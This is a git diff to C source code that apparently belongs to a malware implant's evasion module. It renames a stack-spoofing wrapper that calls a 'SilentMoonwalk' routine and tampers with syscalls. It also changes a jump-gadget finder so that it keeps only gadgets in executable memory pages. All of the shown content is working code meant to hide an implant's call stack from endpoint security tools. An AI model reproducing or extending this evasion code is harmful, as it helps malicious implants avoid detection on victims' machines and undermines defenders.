@@ -5,7 +5,7 @@
 #include "../../../headers/agent/evasion/Common.h"
 #include "../../../headers/cstdreplacement/localcstd.h"
 
-PVOID SpoofStack(
+PVOID SpoofStackFunc(
     _In_ PVOID pFunction,
     _In_ INT Nargs,
     _Inout_ PVOID a,
@@ -16,7 +16,7 @@ PVOID SpoofStack(
     _Inout_ PVOID f,
     _Inout_ PVOID g,
     _Inout_ PVOID h,
-    _Inout_ PVOID j
+    _Inout_ PVOID i
    )
 {
     Args args = {0};
@@ -29,7 +29,7 @@ PVOID SpoofStack(
     args.Arg06 = f;
     args.Arg07 = g;
     args.Arg08 = h;
-    args.Arg09 = j;
+    args.Arg09 = i;
 
 
     return SilentMoonwalkMain(pFunction, &args, agent->Walker->RetAddr);
@@ -100,12 +100,20 @@ NTSTATUS TemperSyscallAndSpoofStack(
 
 PVOID FindJmpGadget( IN PVOID LOC, IN SIZE_T Len, IN PVOID Pattern, IN SIZE_T PatLen ) {
 
+    MEMORY_BASIC_INFORMATION MBI = {0};
+    SIZE_T OutSize = 0;
+    int index = 0;
+
     if ( (!LOC || ! Len) || ( !Pattern || ! PatLen))
         return NULL;
 
     for ( SIZE_T i = 0; i < Len; i++ ) {
-        if ( MemoryCompare( (PVOID)(LOC + i), Pattern, PatLen ) == 0 ) {
-            return (PVOID)(LOC + i);
+        if ( MemoryCompare( ((PBYTE)LOC + i), Pattern, PatLen ) == 0 ) {
+
+            agent->apis->pNtQueryVirtualMemory(NtCurrentProcess(), ((PBYTE)LOC + i), MemoryBasicInformation, &MBI, sizeof(MEMORY_BASIC_INFORMATION), &OutSize);
+            if(MBI.Protect == PAGE_EXECUTE_READWRITE || MBI.Protect == PAGE_EXECUTE_WRITECOPY || MBI.Protect == PAGE_EXECUTE_READ || MBI.Protect == PAGE_EXECUTE) {
+                return ((PBYTE)LOC + i);
+            }
         }
     }
     return NULL;
